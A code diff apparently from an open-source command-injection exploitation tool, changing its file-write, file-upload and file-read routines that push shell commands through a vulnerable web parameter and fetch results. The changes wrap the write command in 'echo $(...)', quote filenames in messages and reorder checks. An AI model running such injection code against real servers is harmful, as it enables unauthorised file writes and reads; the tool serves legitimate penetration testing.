@@ -77,7 +77,9 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_meth
     dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
   else:
     dest_to_write = menu.options.file_dest
-  cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
+
+  # Execute command
+  cmd = "echo $(" + settings.FILE_WRITE + " '"+ content + "'" + " > " + "'" + dest_to_write + "'" + ")"
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
   shell = "".join(str(p) for p in shell)
@@ -88,7 +90,7 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_meth
   shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
   shell = "".join(str(p) for p in shell)
   if shell:
-    sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!" + Style.RESET_ALL + "\n")
+    sys.stdout.write(Style.BRIGHT + "(!) The '" + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +"' file was created successfully!" + Style.RESET_ALL + "\n")
     sys.stdout.flush()
   else:
    sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL + "\n")
@@ -131,7 +133,7 @@ def file_upload(separator, payload, TAG, delay, prefix, suffix, http_request_met
   if shell:
     if menu.options.verbose:
       print ""
-    sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was uploaded successfully!" + Style.RESET_ALL + "\n")
+    sys.stdout.write(Style.BRIGHT + "(!) The '" + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +"' file was uploaded successfully!" + Style.RESET_ALL + "\n")
     sys.stdout.flush()
   else:
    sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL + "\n")
@@ -143,16 +145,16 @@ Check the defined options
 """
 def do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
   
-  if menu.options.file_read:
-    file_read(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-    settings.FILE_ACCESS_DONE = True
-
   if menu.options.file_write:
     file_write(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True
 
   if menu.options.file_upload:
     file_upload(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+    settings.FILE_ACCESS_DONE = True
+
+  if menu.options.file_read:
+    file_read(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True
 
   if settings.FILE_ACCESS_DONE:
